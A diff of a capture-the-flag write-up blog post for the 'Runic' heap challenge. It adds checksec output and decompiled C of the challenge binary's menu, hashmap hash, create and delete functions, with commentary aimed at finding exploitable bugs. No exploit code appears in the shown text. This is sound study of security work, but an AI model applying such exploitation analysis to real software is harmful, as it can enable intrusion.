@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2023-pwn\/"
-        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Apocalypse, htb, pwn, heap, tcache, UDA, Buffer Overflow, ROP","wordcount":  14764 ,
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Apocalypse, htb, pwn, heap, tcache, UDA, Buffer Overflow, ROP","wordcount":  20044 ,
         "url": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2023-pwn\/","datePublished": "2023-03-23T20:00:01+07:00","dateModified": "2023-03-26T02:56:55+07:00","publisher": {
             "@type": "Organization",
             "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
@@ -76,8 +76,8 @@
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cyber Apocalypse 2023: Pwn</h1><div class="post-meta">
             <div class="post-meta-line">
                 </div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 23, 2023">Mar 23, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;14764 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;70 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 23, 2023">Mar 23, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;20044 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;95 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -159,7 +159,14 @@
         <li><a href="#runic">Runic</a>
           <ul>
             <li><a href="#initial-analysis-6">Initial Analysis</a></li>
-            <li><a href="#solution-6">Solution</a></li>
+            <li><a href="#solution-6">Solution</a>
+              <ul>
+                <li><a href="#leak-heap-address">Leak heap address</a></li>
+                <li><a href="#leak-libc-address">Leak libc address</a></li>
+                <li><a href="#gain-remote-code-execution-3">Gain Remote Code Execution</a></li>
+                <li><a href="#full-script-6">Full Script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
       </ul>
@@ -4387,8 +4394,1587 @@
         </div>
     </div>
 <h3 id="initial-analysis-6">Initial Analysis</h3>
-<p>Under Construction</p>
+<p>We were given a binary file called <code>runic</code> and <code>libc.so.6</code>. Checking the given <code>libc.so.6</code>, it is a <code>libc-2.35</code>. Let&rsquo;s <code>checksec</code> it first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, the binary enabled all protections. Let&rsquo;s start disassemble it one by one.</p>
+<p><strong>main</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;This is the ultimate test!</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Do you have what it takes to master the runes?</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Are you worthy of laying your eyes on the Pharaoh&#39;s tomb?</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Only your actions will tell...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. Create rune</span><span class="se">\n</span><span class="s">2. Delete rune</span><span class="se">\n</span><span class="s">3. Edit rune</span><span class="se">\n</span><span class="s">4. Show rune</span><span class="se">\n</span><span class="s">Action: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">read_int</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">show</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid action!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">edit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">create</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">delete</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, so from the main menu, it seems that there are 4 menu that we can use. Let&rsquo;s check each function one by one. And also it called <code>setup</code> first before going to the <code>while</code> loop interactions. Let&rsquo;s check all of it one by one</p>
+<p><strong>setup</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">setup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">63</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">MainTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MainTable</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">items</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">*</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, so there are two global variables called <code>MainTable</code> and <code>items</code>. Each <code>MainTable[idx]</code> entry stored the address of <code>items[24*idx]</code>.</p>
+<p><strong>create</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">nbytes_4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">))</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;That rune name is already in use!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune length: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nbytes</span> <span class="o">=</span> <span class="nf">read_int</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">nbytes</span> <span class="o">&lt;=</span> <span class="mh">0x60</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">nbytes_4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">nbytes</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">nbytes_4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">nbytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="n">nbytes_4</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune contents: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nbytes_4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Max length is 0x60!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, first, let&rsquo;s check the <code>hash</code> function because it is used in the <code>create</code> function.</p>
+<p><strong>hash</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">hash</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">+=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v2</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ah okay, so basically, the <code>hash</code> function is just parsing our input byte-per-byte, add all the bytes value together, and do bitwise operator <code>&amp; 0x3f</code> to ensure the maximum generated hash value is <code>0x3f</code>.</p>
+<p>So, reading through the <code>create</code> function, we can see that it is trying to implement a hashmap table, where:</p>
+<ul>
+<li>It will calculate the <code>hash(rune_name)</code> to get the hashmap index.</li>
+<li>Fetch the <code>items[24*idx]</code> address stored in the <code>MainTable[idx]</code>.</li>
+<li>Create a <code>chunk</code> with size equals to <code>rune_length + 0x8</code>.</li>
+<li>Set <code>items[24*idx]</code> value to <code>rune_name</code>.</li>
+<li>Set <code>items[24*idx] + 0x8</code> value to <code>chunk</code> address.</li>
+<li>Set <code>items[24*idx] + 0x10</code> value to <code>rune_length</code>.</li>
+<li>Set <code>chunk</code> first 8 bytes to <code>rune_name</code>.</li>
+<li>Set <code>chunk+8</code> to <code>rune_contents</code>.</li>
+</ul>
+<p>So far, there isn&rsquo;t any bug in this function. Also the max size that we can allocate is <code>0x60</code>. Let&rsquo;s move to the next function</p>
+<p><strong>delete</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune deleted successfully.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;There&#39;s no rune with that name!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The delete function is implemented properly:</p>
+<ul>
+<li>They check whether the entry is still active or not (Prevent double free)</li>
+<li>They also nullify the <code>items</code> entry after freeing the chunk (Prevent Use-After-Free)</li>
+</ul>
+<p>AFAIk, there isn&rsquo;t anything suspicious that we can do with this function. So, let&rsquo;s move to the next function.</p>
